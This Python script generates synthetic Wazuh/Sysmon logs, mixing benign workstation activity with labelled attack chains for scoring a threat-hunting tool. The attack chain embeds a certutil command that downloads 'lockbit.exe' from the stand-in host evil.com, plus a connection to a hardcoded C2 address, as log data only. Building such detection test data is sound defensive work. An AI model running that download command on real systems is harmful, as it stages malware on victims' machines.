"""
generate_wazuh_data.py
======================
Generates highly realistic Wazuh/Sysmon logs in NDJSON format.
Produces two files:
1. samples/wazuh_benign.json (Pure baseline traffic)
2. samples/wazuh_mixed.json  (Baseline + Embedded Attack Chains)
"""

import json
import uuid
import random
from datetime import datetime, timedelta, timezone
import os

os.makedirs("samples", exist_ok=True)

# ─── Data Dictionaries ────────────────────────────────────────────────────────
BENIGN_IPS = [f"192.168.1.{i}" for i in range(50, 200)]
PUBLIC_IPS = ["142.250.190.46", "8.8.8.8", "1.1.1.1", "104.18.32.7", "52.95.120.3"]
MALICIOUS_C2_IP = "185.14.22.19"

def generate_timestamp(start_dt, end_dt):
    delta = end_dt - start_dt
    int_delta = (delta.days * 24 * 60 * 60) + delta.seconds
    random_second = random.randrange(int_delta)
    # Return a naive datetime that we can add timedelta to easily
    return (start_dt + timedelta(seconds=random_second)).replace(tzinfo=timezone.utc)

def base_log(ts_dt, agent_id, agent_name, rule_id, rule_desc, level):
    # Wazuh/Elasticsearch expects ISO8601 strict
    ts_str = ts_dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    return {
        "@timestamp": ts_str,
        "agent": {"id": agent_id, "name": agent_name},
        "manager": {"name": "wazuh-manager-01"},
        "rule": {"id": rule_id, "level": level, "description": rule_desc},
        "decoder": {"name": "windows_eventchannel"},
        "data": {
            "win": {
                "system": {"providerName": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"},
                "eventdata": {"UtcTime": ts_dt.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]}
            }
        }
    }

def sysmon_1_process(ts_dt, agent_id, agent_name, session_id, parent_id, parent_img, img, cmd, user, process_id=None):
    log = base_log(ts_dt, agent_id, agent_name, "92032", "Sysmon - Process Creation", 3)
    log["data"]["win"]["system"]["eventID"] = "1"
    log["data"]["win"]["eventdata"].update({
        "ProcessGuid": session_id,
        "ProcessId": str(process_id) if process_id else str(random.randint(1000, 9000)),
        "Image": img,
        "CommandLine": cmd,
        "ParentProcessId": parent_id,
        "ParentImage": parent_img,
        "User": user
    })
    return log

def sysmon_3_network(ts_dt, agent_id, agent_name, session_id, img, src_ip, dst_ip, dst_port, user):
    log = base_log(ts_dt, agent_id, agent_name, "92034", "Sysmon - Network connection", 3)
    log["data"]["win"]["system"]["eventID"] = "3"
    log["data"]["win"]["eventdata"].update({
        "ProcessGuid": session_id,
        "Image": img,
        "User": user,
        "Protocol": "tcp",
        "Initiated": "true",
        "SourceIp": src_ip,
        "SourcePort": str(random.randint(49152, 65535)),
        "DestinationIp": dst_ip,
        "DestinationPort": str(dst_port)
    })
    return log

def generate_benign_session(start_dt, end_dt, agent_id, agent_name, src_ip):
    logs = []
    ts = generate_timestamp(start_dt, end_dt)
    session_id = str(uuid.uuid4())
    user = f"CORP\\{agent_name}_user"
    
    # Static PIDs for this mock session to ensure linkage
    EXPLORER_PID = "1420"
    SERVICES_PID = "580"

    # Session: Explorer -> Chrome -> Network
    logs.append(sysmon_1_process(ts, agent_id, agent_name, session_id, 
        "1000", "C:\\Windows\\System32\\userinit.exe", "C:\\Windows\\explorer.exe", "explorer.exe", user, process_id=EXPLORER_PID))
    
    ts += timedelta(seconds=random.randint(1, 10))
    chrome_session = str(uuid.uuid4())
    logs.append(sysmon_1_process(ts, agent_id, agent_name, chrome_session,
        EXPLORER_PID, "C:\\Windows\\explorer.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\"", user))
    
    ts += timedelta(seconds=2)
    logs.append(sysmon_3_network(ts, agent_id, agent_name, chrome_session, 
        "C:\\Program Files\\Google\\Chrome\\chrome.exe", src_ip, random.choice(PUBLIC_IPS), 443, user))
    
    # Session: Svchost -> Network (background telemetry)
    ts += timedelta(minutes=random.randint(5, 30))
    session_id_2 = str(uuid.uuid4())
    logs.append(sysmon_1_process(ts, agent_id, agent_name, session_id_2, 
        SERVICES_PID, "C:\\Windows\\System32\\services.exe", "C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs", "NT AUTHORITY\\SYSTEM"))
    
    ts += timedelta(seconds=1)
    logs.append(sysmon_3_network(ts, agent_id, agent_name, session_id_2, 
        "C:\\Windows\\System32\\svchost.exe", src_ip, "204.79.197.200", 443, "NT AUTHORITY\\SYSTEM"))
        
    return logs

def generate_attack_session(start_dt, agent_id, agent_name, src_ip):
    logs = []
    ts = start_dt
    session_id = str(uuid.uuid4())
    user = "NT AUTHORITY\\SYSTEM"
    
    OUTLOOK_PID = "4411"
    WINWORD_PID = "5512"
    
    # 1. OUTLOOK creating WINWORD (from phishing macro)
    logs.append(sysmon_1_process(ts, agent_id, agent_name, session_id,
        "1100", "C:\\Windows\\explorer.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "outlook.exe", user, process_id=OUTLOOK_PID))
    
    ts += timedelta(seconds=5)
    winword_session = str(uuid.uuid4())
    logs.append(sysmon_1_process(ts, agent_id, agent_name, winword_session,
        OUTLOOK_PID, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "winword.exe /safe", user, process_id=WINWORD_PID))
    
    # 2. WINWORD creating certutil (to download payload)
    ts += timedelta(seconds=2)
    cert_session = str(uuid.uuid4())
    logs.append(sysmon_1_process(ts, agent_id, agent_name, cert_session,
        WINWORD_PID, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "C:\\Windows\\System32\\certutil.exe", "certutil -urlcache -f http://evil.com/lockbit.exe C:\\temp\\lockbit.exe", user))
    
    # 3. Payload network activity
    ts += timedelta(seconds=1)
    logs.append(sysmon_3_network(ts, agent_id, agent_name, cert_session, 
        "C:\\Windows\\System32\\certutil.exe", src_ip, MALICIOUS_C2_IP, 443, user))
        
    return logs

def main():
    start_dt = datetime.now(timezone.utc) - timedelta(days=2)
    end_dt = datetime.now(timezone.utc)
    
    benign_logs = []
    
    print("Generating Benign Dataset...")
    for i, ip in enumerate(BENIGN_IPS):
        agent_id = f"{i:03d}"
        agent_name = f"win-workstation-{agent_id}"
        # Each workstation does 10 normal sessions over 2 days
        for _ in range(10):
            benign_logs.extend(generate_benign_session(start_dt, end_dt, agent_id, agent_name, ip))
            
    benign_logs.sort(key=lambda x: x["@timestamp"])
    
    with open("samples/wazuh_benign.json", "w") as f:
        for log in benign_logs:
            f.write(json.dumps(log) + "\n")
            
    print(f" -> Wrote {len(benign_logs)} benign logs to samples/wazuh_benign.json")
    
    ###########################################################################
    
    print("Generating Mixed Malicious Dataset...")
    mixed_logs = list(benign_logs)
    
    # Inject 3 distinct attacks scattered across the timeline, with the last one being "live"
    attack_times = [
        start_dt + timedelta(hours=12),
        start_dt + timedelta(hours=36),
        end_dt - timedelta(minutes=2)    # This one will be picked up by the immediate 'hunt' cycle
    ]
    
    for i, a_ts in enumerate(attack_times):
        ip = BENIGN_IPS[i]
        agent_id = f"{i:03d}"
        agent_name = f"win-workstation-{agent_id}"
        attack_chain = generate_attack_session(a_ts, agent_id, agent_name, ip)
        # Label the attack logs for SentinelHunter metrics (this normally wouldn't be in Wazuh, but we need it for scoring)
        for log in attack_chain:
            log["label"] = 1
        mixed_logs.extend(attack_chain)
        
    mixed_logs.sort(key=lambda x: x["@timestamp"])
    
    with open("samples/wazuh_mixed.json", "w") as f:
        for log in mixed_logs:
            f.write(json.dumps(log) + "\n")
            
    print(f" -> Wrote {len(mixed_logs)} mixed logs to samples/wazuh_mixed.json")

if __name__ == "__main__":
    main()
